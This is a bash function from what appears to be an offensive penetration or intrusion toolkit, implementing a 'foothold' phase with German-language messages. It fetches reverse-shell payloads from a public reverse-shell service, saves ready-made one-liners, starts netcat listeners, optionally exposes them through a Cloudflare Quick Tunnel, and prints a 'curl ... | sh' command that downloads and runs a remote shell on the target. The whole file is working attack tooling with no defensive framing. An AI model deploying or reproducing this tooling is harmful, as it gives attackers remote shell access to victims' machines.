# shellcheck shell=bash
# Phase 40 — foothold: reverse-shell-as-a-service (lukechilds) + nc listener
# + optional Cloudflare Quick Tunnel so the target can reach the operator.
# Requires ENGAGE_LHOST (operator-reachable IP) and ENGAGE_LPORT.
phase_foothold() {
  state_done 40 && { echo "[40] foothold ✓ (skip)"; return 0; }
  local lhost="${ENGAGE_LHOST:?ENGAGE_LHOST setzen (Operator-IP, vom Ziel erreichbar)}"
  local lport="${ENGAGE_LPORT:-4444}"
  local sid="p2s-$ENGAGE_SID"
  local paydir="$ENGAGE_DIR/payloads"
  mkdir -p "$paydir"

  rs_ensure_cloned
  local payload="$paydir/r"
  if rs_fetch_payload "$lhost" "$lport" "$payload"; then
    state_set 40 RS_PAYLOAD "$payload"
  else
    state_set 40 RS_PAYLOAD "fetch-failed"
  fi
  rs_oneliners "$lhost" "$lport" > "$paydir/oneliners.txt"

  local jobs=(
    "listener|echo '[listener] warte auf Rückkanal auf $lhost:$lport'; nc -lvnp $lport"
  )
  # RAAS extra listener is ON by default (ENGAGE_RS=off to skip).
  if [[ "${ENGAGE_RS:-on}" != "off" ]]; then
    local rsport="${ENGAGE_RS_PORT:-4445}"
    jobs+=("rs-raas-$rsport|echo '[rs] lukechilds reverse-shell.sh — Listener $rsport (curl $(rs_url)/$lhost:$rsport | sh)'; nc -lvnp $rsport")
    state_set 40 RS_PORT "$rsport"
    if rs_fetch_payload "$lhost" "$rsport" "$paydir/r-$rsport"; then
      :
    fi
  fi

  if [[ "${ENGAGE_TUNNEL:-}" == "on" ]]; then
    local turl="http://127.0.0.1:$lport"
    if command -v cloudflared >/dev/null 2>&1; then
      jobs+=("cf-tunnel|echo '[tunnel] Quick Tunnel → $turl'; cloudflared tunnel --no-autoupdate --url $turl")
    elif command -v docker >/dev/null 2>&1; then
      jobs+=("cf-tunnel|echo '[tunnel] docker cloudflared → $turl'; docker run --rm --network host cloudflare/cloudflared:latest tunnel --no-autoupdate --url $turl")
    else
      echo "[40] WARN: ENGAGE_TUNNEL=on aber weder cloudflared noch docker — skip" | tee -a "$ENGAGE_DIR/logs/40-tunnel.warn"
    fi
    state_set 40 TUNNEL "on"
  else
    state_set 40 TUNNEL "off"
  fi

  term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"

  state_set 40 LISTEN_HOST "$lhost"
  state_set 40 LISTEN_PORT "$lport"
  state_set 40 TERM_SESSION "$sid"
  state_mark 40

  cat <<EOF
[40] foothold ✓ Listener läuft (Session: $sid, Port $lport)
     RAAS-Payloads: $paydir/oneliners.txt
     lukechilds:    curl -fsSL '$(rs_url)/$lhost:$lport' | sh

Payloads (Ziel-OS):
$(cat "$paydir/oneliners.txt")
EOF
}
